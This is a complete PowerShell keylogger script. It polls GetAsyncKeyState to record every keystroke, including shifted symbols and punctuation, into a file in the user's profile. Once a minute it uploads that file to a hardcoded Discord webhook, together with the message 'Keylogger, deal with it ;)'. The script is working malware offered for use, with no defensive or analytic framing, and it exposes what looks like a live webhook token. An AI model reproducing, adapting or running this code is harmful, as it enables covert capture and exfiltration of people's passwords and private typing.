# Load Windows API function
$signature = @"
[DllImport("user32.dll")]
public static extern short GetAsyncKeyState(int vKey);
"@
Add-Type -MemberDefinition $signature -Name "Keyboard" -Namespace Win32

function Send-ToDiscord {
    param (
        [Parameter(Mandatory=$true)]
        [string]$filePath,
        [Parameter(Mandatory=$true)]
        [string]$hookUrl
    )


    $message = @{
        username = $env:USERNAME
        content = "Keylogger, deal with it ;)"
    }

    # Send message
    Invoke-RestMethod -Uri $hookUrl -Method Post -ContentType 'Application/Json' -Body ($message | ConvertTo-Json)

    # Upload the file
    curl.exe -F "file1=@$filePath" $hookUrl
}
$discordWebhookUrl = 'https://discord.com/api/webhooks/1369744916930101451/Gw5kNCcUdAuQ9u9QNmWXsc6La9x5jXVeoDZU353M7kg3EkvZh4lWEWIU7OjuUYqiS3IR'
# Output file

$logPath = "$env:USERPROFILE\keylog.txt"

# Key range to scan
$keys = 1..254

# Symbol map for digits + shift (e.g., 1 => !, 2 => @)
$shiftSymbols = @{
    48 = ')'  # 0
    49 = '!'  # 1
    50 = '@'  # 2
    51 = '#'  # 3
    52 = '$'  # 4
    53 = '%'  # 5
    54 = '^'  # 6
    55 = '&'  # 7
    56 = '*'  # 8
    57 = '('  # 9
}

# Placeholder function that runs every minute
function Send-Log {
    # Add your logic here (e.g., move, compress, clear file, test message)
    Write-Host "Triggered Send-Log at $(Get-Date)"
}

# Timer init
$lastCheck = Get-Date

# Main loop
while ($true) {
    foreach ($code in $keys) {
        $state = [Win32.Keyboard]::GetAsyncKeyState($code)
        if ($state -eq -32767) {
            $shift = [Win32.Keyboard]::GetAsyncKeyState(16) -lt 0
            $caps  = [console]::CapsLock

            # A–Z
            if ($code -ge 65 -and $code -le 90) {
                $upper = $caps -xor $shift
                $char = if ($upper) { [char]$code } else { [char]($code + 32) }
                Add-Content -Path $logPath -NoNewline -Value $char
            }
            # 0–9 and shifted symbols
            elseif ($code -ge 48 -and $code -le 57) {
                if ($shift -and $shiftSymbols.ContainsKey($code)) {
                    $char = $shiftSymbols[$code]
                } else {
                    $char = [char]$code
                }
                Add-Content -Path $logPath -NoNewline -Value $char
            }
            # Spacebar
            elseif ($code -eq 32) {
                Add-Content -Path $logPath -NoNewline -Value " "
            }
            # Optional: Special character keys
            elseif ($code -eq 190) {
                $char = if ($shift) { '>' } else { '.' }
                Add-Content -Path $logPath -NoNewline -Value $char
            }
            elseif ($code -eq 188) {
                $char = if ($shift) { '<' } else { ',' }
                Add-Content -Path $logPath -NoNewline -Value $char
            }
            elseif ($code -eq 191) {
                $char = if ($shift) { '?' } else { '/' }
                Add-Content -Path $logPath -NoNewline -Value $char
            }
            elseif ($code -eq 186) {
                $char = if ($shift) { ':' } else { ';' }
                Add-Content -Path $logPath -NoNewline -Value $char
            }
            elseif ($code -eq 222) {
                $char = if ($shift) { '"' } else { "'" }
                Add-Content -Path $logPath -NoNewline -Value $char
            }
        }
    }

    # Trigger function every 60 seconds
    $now = Get-Date
    if (($now - $lastCheck).TotalSeconds -ge 60) {
        Send-ToDiscord -filePath $logPath -hookUrl $discordWebhookUrl
        $lastCheck = $now
    }

    Start-Sleep -Milliseconds 50
}